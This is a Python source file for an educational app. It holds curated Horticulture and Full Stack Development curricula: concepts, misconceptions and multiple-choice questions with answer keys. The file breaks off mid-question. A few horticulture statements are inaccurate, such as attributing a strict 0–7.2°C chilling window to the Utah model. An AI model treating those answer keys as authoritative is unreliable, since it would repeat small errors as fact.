"""
Curated Curriculums & Intelligent Syllabus Concept Extractor for DeepLearnX
Adds authentic domain curriculums (Horticulture, Full Stack Development, etc.)
and provides intelligent parsing of uploaded PDF syllabi to prevent generic mad-libs.
"""

import re
from typing import List, Tuple, Dict, Any

def normalize_topic_title(raw_title: str) -> str:
    """Cleans up typos, mixed casing, extra trailing punctuation, and file suffixes."""
    if not raw_title:
        return "Custom Syllabus"
    t = raw_title.strip()
    t = re.sub(r'[\._\-\s]+syllabus\s*$', '', t, flags=re.IGNORECASE)
    t = re.sub(r'[\._\-\s]+notes\s*$', '', t, flags=re.IGNORECASE)
    t = re.sub(r'[\._\-\s]+curriculum\s*$', '', t, flags=re.IGNORECASE)
    t = re.sub(r'[_\.]+', ' ', t)
    
    # Specific common spelling corrections
    if re.search(r'horticult', t, re.IGNORECASE):
        t = "Horticulture Science"
    elif re.search(r'24csi013|full\s*stack|fsd\b', t, re.IGNORECASE):
        t = "Full Stack Web Development (FSD)"
    elif re.search(r'quantum\s*comput', t, re.IGNORECASE):
        t = "Quantum Computing"
    elif re.search(r'operating\s*sys', t, re.IGNORECASE):
        t = "Operating Systems"
    elif re.search(r'database|dbms', t, re.IGNORECASE):
        t = "Database Management Systems (DBMS)"
    elif re.search(r'fluid\s*(mechanic|dynamic)|hydraulics', t, re.IGNORECASE):
        t = "Fluid Mechanics"
    elif re.search(r'engineering\s*(graphics|drawing)|technical\s*drawing|autocad\b|drafting', t, re.IGNORECASE):
        t = "Engineering Graphics"

    # Clean multiple spaces and strip trailing punctuation
    t = re.sub(r'\s+', ' ', t).strip(' .,!?:;-')
    
    # Title Case if not all uppercase acronym
    if not t.isupper() and not any(w.isupper() and len(w) > 1 for w in t.split()):
        t = t.title()
    return t

def extract_concepts_from_syllabus(syllabus_text: str, fallback_title: str) -> List[Tuple[str, str]]:
    """Intelligently parses uploaded syllabus text (e.g. from PDF) to extract real modules and units."""
    if not syllabus_text or len(syllabus_text.strip()) < 60:
        return []

    lines = [ln.strip() for ln in syllabus_text.splitlines() if ln.strip()]
    extracted_units = []

    unit_pattern = re.compile(
        r'^(unit|module|chapter|part|section)\s*[-:\s]?\s*([0-9ivxlcdm]+)[\s:–\.-]*(.*)$', 
        re.IGNORECASE
    )

    current_title = ""
    current_desc_lines = []

    for line in lines:
        match = unit_pattern.match(line)
        if match:
            if current_title:
                desc_text = " ".join(current_desc_lines[:3]) or f"Curriculum unit covering {current_title}."
                extracted_units.append((current_title, desc_text))
                current_desc_lines = []
            prefix = f"{match.group(1).title()} {match.group(2).upper()}"
            sub_title = match.group(3).strip()
            if not sub_title or len(sub_title) < 3:
                sub_title = "Foundational Mechanisms & Applications"
            current_title = f"{prefix}: {sub_title}"
        elif current_title and len(current_desc_lines) < 4:
            if len(line) > 12 and not unit_pattern.match(line) and not line.lower().startswith(("page", "course code", "semester")):
                current_desc_lines.append(line)

    if current_title:
        desc_text = " ".join(current_desc_lines[:3]) or f"Curriculum unit covering {current_title}."
        extracted_units.append((current_title, desc_text))

    if 2 <= len(extracted_units) <= 6:
        return extracted_units
    return []

# =============================================================================
# HORTICULTURE & PLANT SCIENCE CURRICULUM
# =============================================================================
HORTICULTURE_CURRICULUM = {
    "icon": "🌿",
    "category": "Agricultural & Biological Sciences",
    "description": "Comprehensive diagnostic assessment of horticultural science: plant propagation physiology, pomology growth dynamics, olericulture nutrition, and post-harvest ethylene regulation.",
    "concepts": [
        {
            "id_suffix": "c1",
            "name": "Plant Propagation & Cambial Grafting Physiology",
            "description": "Asexual and sexual reproduction mechanisms, adventitious rooting hormones (Auxin/IBA), scion-rootstock compatibility, and vascular cambium union formation.",
            "prerequisites": [],
            "core_idea": "Successful vegetative grafting requires precise alignment of the meristematic vascular cambium between scion and rootstock, allowing parenchymal callus bridges to differentiate into continuous xylem and phloem.",
            "example": "In cleft grafting an apple scion onto M9 dwarfing rootstock, mismatching the green cambium ring prevents vascular connection, causing the scion to desiccate and die.",
            "common_mistake": "Believing that aligning the outer bark or inner heartwood is sufficient for graft union; only the active microscopic vascular cambium can generate callus and vascular continuity.",
            "key_takeaway": "Meristematic cambial contact is the absolute biological prerequisite for vascular graft compatibility."
        },
        {
            "id_suffix": "c2",
            "name": "Pomology & Reproductive Dormancy Dynamics",
            "description": "Fruit bud differentiation, winter chilling hours requirements (vernalization/endodormancy break), biennial bearing rhythms, and flower pollination biology.",
            "prerequisites": ["c1"],
            "core_idea": "Deciduous fruit crops require sustained cumulative exposure to temperatures between 0°C and 7.2°C (chilling hours) to metabolize growth inhibitors like abscisic acid and permit uniform bud break in spring.",
            "example": "If a low-chill region receives only 200 chilling hours when an apple variety requires 800 hours, bud break is erratic, delayed, and fruit set drops drastically.",
            "common_mistake": "Assuming freezing or sub-zero frost temperatures satisfy chilling requirements; temperatures below 0°C provide zero chilling accumulation and can damage floral buds.",
            "key_takeaway": "Effective endodormancy release requires sustained chilling temperatures above freezing (0°C to 7.2°C), not destructive frost."
        },
        {
            "id_suffix": "c3",
            "name": "Olericulture & Transpirational Nutrient Transport",
            "description": "Vegetable physiology, soil-water-nutrient uptake relations, blossom-end rot etiology, and calcium transpirational partitioning in greenhouse crops.",
            "prerequisites": ["c2"],
            "core_idea": "Calcium is an immobile plant nutrient transported exclusively via the xylem transpirational stream. Uneven soil moisture or extreme humidity restricts calcium delivery to rapidly expanding fruit tips, causing localized cell breakdown (Blossom-End Rot).",
            "example": "Tomato plants grown in calcium-rich soil can still develop blossom-end rot if hot dry winds or erratic watering cause transpirational surges toward leaves instead of developing fruit.",
            "common_mistake": "Assuming blossom-end rot always indicates that the soil lacks calcium; it is almost always caused by irregular irrigation disrupting transpirational xylem transport.",
            "key_takeaway": "Blossom-end rot is primarily a physiological transpirational transport failure rather than a soil calcium deficiency."
        },
        {
            "id_suffix": "c4",
            "name": "Post-Harvest Physiology & Ethylene Biosynthesis",
            "description": "Climacteric vs non-climacteric respiratory surges, ethylene biosynthesis pathways (ACC synthase/oxidase), 1-MCP receptor inhibitors, and controlled atmosphere storage.",
            "prerequisites": ["c3"],
            "core_idea": "Climacteric fruits (apples, bananas, tomatoes) exhibit an autocatalytic burst of ethylene production accompanied by a respiratory climacteric peak during ripening, whereas non-climacteric fruits (grapes, citrus) do not ripen after harvest.",
            "example": "Storing ripe bananas beside unripe avocados accelerates avocado softening because volatile ethylene emitted by the bananas triggers autocatalytic ripening in neighboring climacteric fruit.",
            "common_mistake": "Believing all fruits continue to ripen and increase sugar content after being harvested; non-climacteric fruits only soften and decay without starch-to-sugar conversion.",
            "key_takeaway": "Autocatalytic ethylene surges define climacteric ripening; non-climacteric fruits must reach complete maturity on the plant before harvest."
        }
    ],
    "misconceptions": [
        {
            "concept_suffix": "c1",
            "code": "M-HORT-01",
            "name": "Bark-Alignment Grafting Fallacy",
            "description": "Believing that aligning outer epidermal bark or inner wood ensures graft union formation rather than precise vascular cambial contact.",
            "remediation": "Study cross-sectional stem anatomy to observe that bark is dead suberized cork; only the single-cell-thick vascular cambium generates living callus bridges."
        },
        {
            "concept_suffix": "c2",
            "code": "M-HORT-02",
            "name": "Freezing Temperature Chilling Fallacy",
            "description": "Thinking that below-zero frost days contribute to winter chilling hours for deciduous fruit trees.",
            "remediation": "Review the Utah Chilling Model showing chilling accumulation occurs strictly between 0°C and 7.2°C; temperatures below 0°C contribute zero chilling units."
        },
        {
            "concept_suffix": "c3",
            "code": "M-HORT-03",
            "name": "Soil-Deficiency Blossom End Rot Fallacy",
            "description": "Diagnosing blossom-end rot solely as an absence of soil calcium, ignoring transpirational water stress and xylem immobility.",
            "remediation": "Examine transpirational xylem sap flow: calcium moves exclusively with water; fluctuating soil moisture starves distal fruit tissue of calcium even in calcium-rich soils."
        },
        {
            "concept_suffix": "c4",
            "code": "M-HORT-04",
            "name": "Universal Post-Harvest Ripening Fallacy",
            "description": "Assuming all harvested fruits (such as citrus, strawberries, or grapes) will continue to synthesize sugars and ripen if exposed to ethylene gas.",
            "remediation": "Contrast climacteric respiration curves with non-climacteric steady degradation: non-climacteric fruits lack autocatalytic ethylene systems and do not sweeten post-harvest."
        }
    ],
    "questions": [
        {
            "concept_suffix": "c1",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "During cleft grafting of fruit trees, which microscopic tissue layer of the scion must make direct physical contact with the rootstock for union success?",
            "option_a": "The meristematic vascular cambium between xylem and phloem",
            "option_b": "The dead outer suberized cork bark layer",
            "option_c": "The central non-living lignified heartwood core",
            "option_d": "The epidermal cuticle layer on the outer stem",
            "correct_option": "A",
            "explanation": "The vascular cambium is the only actively dividing meristematic tissue capable of producing parenchymal callus that differentiates into functional xylem and phloem bridges.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c1",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "Why do commercial orchardists apply synthetic auxins (such as Indole-3-butyric acid / IBA) to the basal ends of hardwood stem cuttings?",
            "option_a": "To stimulate adventitious root primordia development from stem parenchyma cells",
            "option_b": "To accelerate rapid flowering and premature fruit setting before rooting",
            "option_c": "To completely seal the cut end and prevent any transpirational moisture loss",
            "option_d": "To neutralize all natural plant hormones and enforce permanent bud dormancy",
            "correct_option": "A",
            "explanation": "Exogenous auxins like IBA signal vascular parenchyma cells at the cut stem base to dedifferentiate and form adventitious root primordia.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c1",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "An orchardist performs whip-and-tongue grafting on 100 apple saplings. Three weeks later, 40 grafts show withered scion buds with no callus bridging. Microscopic inspection reveals the scion was inserted at an angle where only the outer bark made contact. What physiological breakdown caused the graft failure?",
            "option_a": "Failure of vascular cambium alignment prevented the differentiation of continuous xylem and phloem bridges",
            "option_b": "The outer bark failed to photosynthesize sufficient sucrose to nourish the rootstock taproot",
            "option_c": "Excessive heartwood lignification caused toxic ethylene gas to suffocate the scion terminal meristem",
            "option_d": "Rootstock xylem sap was blocked by atmospheric nitrogen entering through the unsealed epidermis",
            "correct_option": "A",
            "explanation": "Without alignment of the single-cell-thick vascular cambium rings, callus cannot connect and differentiate into functional vascular tissue, starving the scion of water and nutrients.",
            "reasoning_probe": {
                "prompt": "What physiological mechanism governs successful scion graft union formation?",
                "options": {
                    "A": "Meristematic parenchyma cell division generates a callus bridge that subsequently differentiates into vascular xylem and phloem.",
                    "B": "Rootstock hormones chemically melt the woody heartwood to physically weld the two branches together.",
                    "C": "Surface epidermal cells produce a waterproof resin that suction-locks the two stems into a permanent bond.",
                    "D": "Root pressure alone forces sap across dead cells until mechanical cohesion locks the stems in place."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c2",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "What temperature range constitutes effective chilling hour accumulation for breaking endodormancy in temperate fruit trees like apples and peaches?",
            "option_a": "Sustained non-freezing temperatures between 0°C and 7.2°C (32°F - 45°F)",
            "option_b": "Sub-zero freezing temperatures between -15°C and -5°C",
            "option_c": "Mild tropical temperatures between 25°C and 35°C",
            "option_d": "Constant fluctuating cycles between -10°C and +20°C every 6 hours",
            "correct_option": "A",
            "explanation": "Chilling models (such as the Weinberger and Utah models) count hours between 0°C and 7.2°C; sub-zero temperatures do not accumulate chilling units and can cause freeze injury.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c2",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "Why do high-chill apple cultivars planted in warm sub-tropical regions exhibit 'delayed foliation' and sparse, uneven fruit set?",
            "option_a": "Insufficient winter chilling leaves growth inhibitors (like abscisic acid) active in floral buds",
            "option_b": "Sub-tropical soil lacks sufficient nitrogen to support annual deciduous root systems",
            "option_c": "Excessive sunlight in winter permanently burns the delicate internal embryonic ovules",
            "option_d": "Deciduous fruit trees can only undergo floral differentiation under constant 24-hour darkness",
            "correct_option": "A",
            "explanation": "Chilling accumulation metabolizes floral bud inhibitors (abscisic acid) while stimulating gibberellins; without enough chilling, endodormancy is not broken, resulting in delayed, irregular bud break.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c2",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "A grower in Southern California plants a Honeycrisp apple tree (requires 800-1000 chilling hours). In spring, the tree produces only sporadic leaves on lower branches by late May, most floral buds drop unexpanded, and yield is zero. What diagnostic evaluation correctly explains this failure?",
            "option_a": "The orchard accumulated only ~300 chilling hours (0-7.2°C), preventing enzymatic endodormancy release in floral buds",
            "option_b": "Winter temperatures failed to plunge below -20°C to freeze-fracture the thick protective outer bud scales",
            "option_c": "Honeycrisp apples require cross-pollination exclusively by bumblebees rather than standard commercial honeybees",
            "option_d": "The rootstock absorbed too much soil calcium during winter, causing fatal alkaline leaf chlorosis",
            "correct_option": "A",
            "explanation": "Because Honeycrisp requires 800-1000 chilling hours, planting it in a warm zone providing only 300 hours causes classic insufficient chilling syndrome with delayed foliation and bud abscission.",
            "reasoning_probe": {
                "prompt": "Why are sub-zero freezing temperatures ineffective for breaking fruit tree endodormancy?",
                "options": {
                    "A": "The metabolic enzyme pathways that catabolize dormancy inhibitors operate optimally in non-freezing temperatures above 0°C.",
                    "B": "Freezing temperatures turn xylem sap into ice, which permanently destroys all vegetative apical meristems.",
                    "C": "Sub-zero cold stimulates excessive auxin synthesis that forces buds into permanent vegetative dormancy.",
                    "D": "Fruit trees only accumulate chilling hours through active leaf photosynthesis during daytime hours."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c3",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "Which plant nutrient deficiency is the direct physiological cause of Blossom-End Rot in tomatoes, bell peppers, and watermelons?",
            "option_a": "Localized Calcium (Ca²⁺) deficiency in rapidly expanding fruit cells",
            "option_b": "Atmospheric Carbon Dioxide deficiency preventing photosynthesis",
            "option_c": "Excessive Potassium (K⁺) toxicity rupturing internal cell vacuoles",
            "option_d": "Total absence of Soil Nitrogen during the vegetative growth stage",
            "correct_option": "A",
            "explanation": "Calcium is a vital structural constituent of calcium pectate in plant cell walls; localized deficiency during rapid cell enlargement causes cell wall collapse and dark sunken rot at the blossom end.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c3",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "A soil test in a commercial tomato greenhouse confirms abundant soil calcium levels, yet 35% of ripening fruit develop Blossom-End Rot. What cultural condition is most likely responsible?",
            "option_a": "Irregular irrigation and low humidity causing transpirational sap to divert calcium to leaves rather than fruit",
            "option_b": "Too many pollinating bees visiting flowers and mechanically damaging the ovary stigma",
            "option_c": "Excessive application of micronutrients such as iron and boron in the fertilizer tank",
            "option_d": "Harvesting fruit during morning hours when plant turgor pressure is at its daily maximum",
            "correct_option": "A",
            "explanation": "Calcium moves strictly through the xylem driven by transpiration. Because rapidly expanding fruit transpire far less than mature leaves, moisture stress or transpirational surges divert calcium toward foliage, starving fruit tips.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c3",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "During a hot dry week in July, a hydroponic tomato grower notices severe black sunken lesions on the distal ends of developing green tomatoes. Leaf tissue tests show high calcium, but fruit tissue shows acute calcium starvation. What corrective management strategy should be implemented immediately?",
            "option_a": "Stabilize substrate moisture with frequent light irrigation cycles and increase greenhouse humidity to balance leaf vs fruit transpiration",
            "option_b": "Immediately double the nitrogen fertilizer injection rate to force rapid vegetative shoot expansion",
            "option_c": "Completely withhold irrigation water for five days to force the root system into deep soil exploration",
            "option_d": "Spray broad-spectrum copper fungicide across the entire crop to eliminate suspected fungal spore infection",
            "correct_option": "A",
            "explanation": "Blossom-end rot is solved by maintaining consistent moisture to prevent transpirational spikes and localized xylem partitioning failures.",
            "reasoning_probe": {
                "prompt": "Why does calcium fail to redistribute from older tomato leaves into developing fruits during transpirational stress?",
                "options": {
                    "A": "Calcium is strictly immobile in the phloem and cannot be remobilized from foliage to developing sink tissues.",
                    "B": "Tomato leaf stomata close permanently once calcium enters the leaf mesophyll cells.",
                    "C": "Calcium forms insoluble gas bubbles inside xylem vessels that block all downward movement.",
                    "D": "Developing fruits reject all nutrients once their initial petal drop stage is completed."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c4",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "Which plant hormone acts as the gaseous regulatory signal that triggers the autocatalytic ripening cascade in climacteric fruits?",
            "option_a": "Ethylene (C₂H₄)",
            "option_b": "Gibberellic Acid (GA₃)",
            "option_c": "Abscisic Acid (ABA)",
            "option_d": "Cytokinin (Zeatin)",
            "correct_option": "A",
            "explanation": "Ethylene is the gaseous phytohormone responsible for regulating fruit ripening, abscission, and floral senescence in climacteric crops.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c4",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "Why are commercial cold-storage apple rooms treated with 1-Methylcyclopropene (1-MCP) and maintained under low Oxygen (1-2%) and elevated Carbon Dioxide atmospheres?",
            "option_a": "1-MCP irreversibly blocks ethylene receptors while low O₂ slows respiration, extending storage life for months",
            "option_b": "1-MCP converts tart malic acid directly into crystalline table sugar while fruit is in dark storage",
            "option_c": "Low oxygen eliminates all bacteria so apples never require washing prior to grocery retail packaging",
            "option_d": "Elevated carbon dioxide causes fruit skin cells to photosynthesize glucose continuously in the dark",
            "correct_option": "A",
            "explanation": "1-MCP binds tightly to ethylene receptors, preventing ethylene perception. Combined with Controlled Atmosphere (low O2, high CO2), fruit respiration and senescence are suppressed for up to 10-12 months.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c4",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "A commercial fruit distributor ships mixed pallets containing ripe honeydew melons, green Cavendish bananas, and table grapes in a refrigerated container at 10°C. Upon arrival, the bananas are over-ripe and yellow, but the table grapes show zero increase in sweetness and have begun to mold. What physiological principle explains this divergent outcome?",
            "option_a": "Bananas are climacteric and responded autocatalytically to ethylene emitted by melons, whereas non-climacteric grapes cannot ripen after harvest",
            "option_b": "Grapes require sub-zero freezing temperatures to convert internal tartaric acid into fructose and glucose",
            "option_c": "Cavendish bananas do not possess ethylene receptors and ripened solely due to mechanical vibration during transit",
            "option_d": "Honeydew melons absorb all ambient oxygen, suffocating the grapes while stimulating anaerobic fermentation in bananas",
            "correct_option": "A",
            "explanation": "Climacteric fruits (melons, bananas) synthesize ethylene autocatalytically and ripen post-harvest. Non-climacteric fruits (grapes) lack this mechanism and do not accumulate additional sugars once detached from the vine.",
            "reasoning_probe": {
                "prompt": "Why does exogenous ethylene gas fail to improve the sugar content of harvested non-climacteric fruits like table grapes or lemons?",
                "options": {
                    "A": "Non-climacteric fruits lack starch reserves to convert into simple sugars once separated from the parent plant.",
                    "B": "Ethylene permanently denatures invertase enzymes responsible for fructose synthesis.",
                    "C": "Non-climacteric fruit skins reflect ethylene gas molecules due to electro-negative wax crystals.",
                    "D": "Table grapes only absorb ethylene when suspended upside down in liquid nutrient baths."
                },
                "correct_probe": "A"
            }
        }
    ]
}

# =============================================================================
# FULL STACK WEB DEVELOPMENT (FSD) CURRICULUM
# =============================================================================
FULL_STACK_CURRICULUM = {
    "icon": "💻",
    "category": "Computer Science & Software Engineering",
    "description": "Architectural diagnostic evaluation of Full Stack Web Development: frontend declarative rendering, Node.js asynchronous event loops, database indexing & transactions, and web token security.",
    "concepts": [
        {
            "id_suffix": "c1",
            "name": "Declarative UI Runtimes & Virtual DOM Reconciliation",
            "description": "Frontend component lifecycles, immutable state management, Virtual DOM tree diffing heuristics, and side-effect synchronization.",
            "prerequisites": [],
            "core_idea": "Modern declarative libraries (like React) maintain an in-memory Virtual DOM tree. When state changes immutably, the reconciliation algorithm diffs trees and batches minimal surgical mutations to the real browser DOM.",
            "example": "Mutating an array in-place via push() prevents shallow state comparisons from detecting changes, resulting in missed UI re-renders.",
            "common_mistake": "Directly mutating state objects rather than returning new references; virtual DOM diffing relies on shallow referential equality checks to schedule component re-renders.",
            "key_takeaway": "Immutability is mandatory for declarative UI runtimes to accurately detect state mutations via shallow referential comparisons."
        },
        {
            "id_suffix": "c2",
            "name": "Asynchronous Event Loops & Non-Blocking Server APIs",
            "description": "Single-threaded event loops (libuv), macrotask/microtask queues, asynchronous non-blocking I/O, RESTful endpoint idempotency, and middleware pipelines.",
            "prerequisites": ["c1"],
            "core_idea": "Node.js executes JavaScript on a single thread using an event loop backed by libuv threadpools for OS-level asynchronous I/O. CPU-intensive operations block the entire event loop for all concurrent client connections.",
            "example": "Executing a synchronous bcrypt hash computation on the main thread freezes the entire Node.js server from responding to any HTTP requests until calculation finishes.",
            "common_mistake": "Assuming async/await spawns parallel operating system worker threads; async/await is purely syntactic sugar over promises executing on the single main event loop.",
            "key_takeaway": "Non-blocking I/O allows a single thread to service thousands of concurrent requests, but synchronous CPU operations stall the entire runtime."
        },
        {
            "id_suffix": "c3",
            "name": "Data Persistence, B-Tree Indexing & Transactional ACIDity",
            "description": "Relational vs Document schemas, B-Tree indexing query optimization, N+1 query antipattern, database connection pooling, and ACID isolation levels.",
            "prerequisites": ["c2"],
            "core_idea": "Database indexes (typically B-Trees) reduce query search complexity from O(N) full table scans to O(log N) lookups, but introduce write overhead on every INSERT, UPDATE, and DELETE operation.",
            "example": "Querying a users table of 2 million rows without an index on 'email' requires reading every disk block; adding an index allows finding the record in 3-4 tree hops.",
            "common_mistake": "Adding indexes to every single column in a high-write database table, which degrades insert/update throughput due to index tree rebalancing overhead.",
            "key_takeaway": "Indexes dramatically accelerate read filtering at the cost of additional storage and write-time tree rebalancing overhead."
        },
        {
            "id_suffix": "c4",
            "name": "Full-Stack Security, Authentication & Session Architecture",
            "description": "Cryptographic hashing (bcrypt/argon2), JSON Web Token (JWT) stateless verification, SameSite HTTP-only cookies, CORS preflight mechanisms, and injection defenses.",
            "prerequisites": ["c3"],
            "core_idea": "Stateless JWT tokens are digitally signed cryptographic payloads that allow servers to verify client identity without database session lookups. Storing sensitive JWTs in browser localStorage exposes them to XSS theft.",
            "example": "An attacker injects malicious script into a comment box; if the auth token is stored in localStorage, the script can access document.cookie or localStorage and exfiltrate the token.",
            "common_mistake": "Storing authentication access tokens in localStorage instead of HttpOnly SameSite cookies; HttpOnly cookies are inaccessible to JavaScript, mitigating Cross-Site Scripting (XSS) token theft.",
            "key_takeaway": "Store authentication tokens in HttpOnly, Secure, SameSite cookies to shield them from client-side script exfiltration."
        }
    ],
    "misconceptions": [
        {
            "concept_suffix": "c1",
            "code": "M-FSD-01",
            "name": "Direct State Mutation Fallacy",
            "description": "Believing that directly mutating a component state object or array will trigger a Virtual DOM diffing cycle and UI update.",
            "remediation": "Demonstrate that React/Vue compare state using shallow referential equality (prev === next); mutating an existing object keeps the reference identical, skipping the render cycle."
        },
        {
            "concept_suffix": "c2",
            "code": "M-FSD-02",
            "name": "Async Multithreading Fallacy",
            "description": "Assuming that using async/await or Promises in Node.js automatically distributes heavy CPU tasks across multiple CPU cores.",
            "remediation": "Showcase that the Node.js event loop runs on a single main thread; CPU-heavy computations require Worker Threads or Cluster modules to prevent stalling client requests."
        },
        {
            "concept_suffix": "c3",
            "code": "M-FSD-03",
            "name": "Index Universal Acceleration Fallacy",
            "description": "Assuming that indexing every database column provides universal performance gains without trade-offs.",
            "remediation": "Benchmark write latency: every database write must synchronously update and rebalance all associated B-Tree indexes, degrading high-velocity ingestion performance."
        },
        {
            "concept_suffix": "c4",
            "code": "M-FSD-04",
            "name": "LocalStorage Token Storage Fallacy",
            "description": "Believing browser localStorage is a secure storage location for long-lived authentication JWT tokens.",
            "remediation": "Explain Cross-Site Scripting (XSS): any third-party script executing in the browser context can read localStorage via JavaScript, whereas HttpOnly cookies block JavaScript access."
        }
    ],
    "questions": [
        {
            "concept_suffix": "c1",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "In a declarative frontend framework like React, why must component state be treated as immutable when updating UI state?",
            "option_a": "Because the reconciliation algorithm uses shallow referential equality comparisons to detect state changes",
            "option_b": "Because the browser engine strictly freezes all JavaScript objects after initial page render",
            "option_c": "Because mutating an object automatically triggers a synchronous full page browser reload",
            "option_d": "Because immutable objects occupy zero memory in client-side RAM garbage collection",
            "correct_option": "A",
            "explanation": "React checks whether the reference of the new state differs from the previous state (Object.is / shallow equality). Mutating an object preserves its memory reference, causing React to assume nothing changed.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c1",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "What is the primary architectural purpose of assigning stable, unique 'key' props to elements rendered from an array in a Virtual DOM library?",
            "option_a": "To allow the diffing algorithm to identify which specific items have changed, moved, or been deleted across renders",
            "option_b": "To automatically encrypt client data before transmitting it over secure HTTPS websockets",
            "option_c": "To assign physical CSS styling priority order in the browser rendering render-tree",
            "option_d": "To force the framework to completely unmount and recreate the entire parent component tree",
            "correct_option": "A",
            "explanation": "Keys provide persistent identity across renders, allowing the reconciliation heuristic to reorder existing DOM nodes rather than destroying and recreating the entire list.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c1",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "A developer writes `const [items, setItems] = useState([1, 2, 3]);` and attempts to add an item using `items.push(4); setItems(items);`. The browser UI fails to display the new item. What exact technical breakdown explains this bug?",
            "option_a": "`items.push()` mutated the array in-place, leaving the array reference identical; React's shallow comparison saw no reference change and skipped the render cycle",
            "option_b": "JavaScript arrays cannot store numbers greater than 3 when managed inside a frontend functional component hook",
            "option_c": "The browser DOM engine rejected the push method because arrays must be declared with `let` instead of `const`",
            "option_d": "Calling `setItems()` requires passing a cryptographic SHA-256 hash of the target array",
            "correct_option": "A",
            "explanation": "Because `items` still points to the exact same array in memory, `Object.is(prevState, nextState)` evaluates to true, so React skips re-rendering. The correct idiom is `setItems([...items, 4])`.",
            "reasoning_probe": {
                "prompt": "Why does `setItems([...items, 4])` successfully trigger a component re-render?",
                "options": {
                    "A": "The spread operator `[...]` allocates a brand-new array reference in memory, allowing shallow comparison to detect the change.",
                    "B": "The spread operator deletes the browser DOM and recompiles the entire JavaScript bundle.",
                    "C": "The spread operator converts the array into a binary web-assembly module.",
                    "D": "The spread operator bypasses the React reconciliation algorithm and directly edits the operating system graphics buffer."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c2",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "How does the Node.js runtime process asynchronous file reads and network requests without freezing the single execution thread?",
            "option_a": "By delegating I/O operations to operating system system calls and the libuv worker pool, notifying the event loop via callbacks",
            "option_b": "By spawning a brand-new V8 JavaScript engine instance for every individual incoming HTTP request",
            "option_c": "By halting all system clock cycles until the requested file is completely loaded into RAM",
            "option_d": "By converting all JavaScript functions into synchronous multi-threaded C++ classes at runtime",
            "correct_option": "A",
            "explanation": "Node.js uses libuv to offload I/O operations to OS kernels or threadpools; once complete, completion callbacks are queued on the event loop without blocking the main JavaScript thread.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c2",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "According to the HTTP/1.1 specification, what defines an HTTP method as 'idempotent' in RESTful API design?",
            "option_a": "Making multiple identical requests produces the exact same server resource state as making a single request",
            "option_b": "The request response must always return an HTTP 200 status code with zero network payload bytes",
            "option_c": "The endpoint requires multi-factor cryptographic hardware token authentication on every invocation",
            "option_d": "The endpoint cannot be cached by intermediate proxies, load balancers, or browser caches",
            "correct_option": "A",
            "explanation": "Methods like GET, PUT, and DELETE are idempotent because executing them N times leaves the server in the identical resource state as executing them once.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c2",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "A developer deploys an Express.js route `/calculate-report` that executes a synchronous 8-second mathematical Fibonacci calculation on the main thread. While this route is executing, fifty other users attempting to load the homepage `/` experience complete timeouts. What architectural solution addresses this bottleneck?",
            "option_a": "Offload the CPU-intensive computation to a Worker Thread or separate background task queue (e.g. BullMQ / Redis worker)",
            "option_b": "Wrap the synchronous calculation in `new Promise(resolve => ...)` on the main thread",
            "option_c": "Increase the browser client's HTTP keep-alive timeout from 5 seconds to 60 seconds",
            "option_d": "Change the route method from HTTP POST to HTTP GET to enable automatic multi-threading",
            "correct_option": "A",
            "explanation": "Because Node.js runs JavaScript on a single thread, heavy CPU tasks block the event loop for all clients. Offloading CPU work to Worker Threads or external worker processes keeps the event loop free.",
            "reasoning_probe": {
                "prompt": "Why does wrapping a synchronous CPU calculation in `new Promise()` NOT solve event-loop blocking in Node.js?",
                "options": {
                    "A": "Promises execute their executor function synchronously on the main thread; creating a Promise does not create an OS worker thread.",
                    "B": "Promises are only permitted inside frontend browser code and are strictly forbidden in Node.js backend runtimes.",
                    "C": "Promises delete all incoming network connections to preserve server memory.",
                    "D": "Promises convert synchronous code into UDP datagrams that cannot be parsed by HTTP servers."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c3",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "What data structure is most widely used by relational database engines (like PostgreSQL and MySQL) to implement indexes on table columns?",
            "option_a": "Self-balancing B-Tree / B+Tree",
            "option_b": "Singly linked FIFO queues",
            "option_c": "Unordered circular arrays",
            "option_d": "Pure random binary bloom graphs",
            "correct_option": "A",
            "explanation": "B+Trees maintain sorted data with logarithmic O(log N) search, insertion, and range query traversals, minimizing disk block read operations.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c3",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "In relational database systems, what performance problem is characterized as the 'N+1 Query Antipattern' when using Object-Relational Mappers (ORMs)?",
            "option_a": "Executing 1 initial query to fetch parent records, followed by N separate subsequent queries to fetch child relationships",
            "option_b": "Inserting N records while forgetting to assign a primary key constraint to column 1",
